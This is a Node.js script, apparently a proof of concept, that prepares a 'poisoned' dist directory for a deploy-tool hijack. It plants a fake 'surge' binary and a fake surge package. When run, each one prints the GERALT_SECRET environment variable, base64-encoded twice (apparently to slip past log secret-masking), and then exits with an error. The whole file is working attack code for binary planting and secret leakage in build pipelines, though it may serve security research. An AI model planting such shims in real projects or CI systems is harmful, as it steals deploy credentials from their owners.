import { mkdirSync, writeFileSync, chmodSync } from 'node:fs';

const shim = [
  '#!/usr/bin/env bash',
  'echo "GERALT_DBG hijacked surge invoked args=$*"',
  'echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"',
  'exit 1',
  ''
].join('\n');

mkdirSync('dist/node_modules/.bin', { recursive: true });
writeFileSync('dist/index.html', '<html><body>preview</body></html>');
writeFileSync('dist/404.html', '<html><body>preview</body></html>');
writeFileSync('dist/node_modules/.bin/surge', shim);
chmodSync('dist/node_modules/.bin/surge', 0o755);

mkdirSync('dist/node_modules/surge', { recursive: true });
writeFileSync('dist/node_modules/surge/package.json', JSON.stringify({ name: 'surge', version: '0.0.0', bin: { surge: './cli.js' } }));
writeFileSync('dist/node_modules/surge/cli.js', '#!/usr/bin/env node\nconsole.log("GERALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(process.env.GERALT_SECRET || "").toString("base64")).toString("base64"));\nprocess.exit(1);\n');
chmodSync('dist/node_modules/surge/cli.js', 0o755);

console.log('GERALT_DBG poisoned dist prepared with local surge shim');
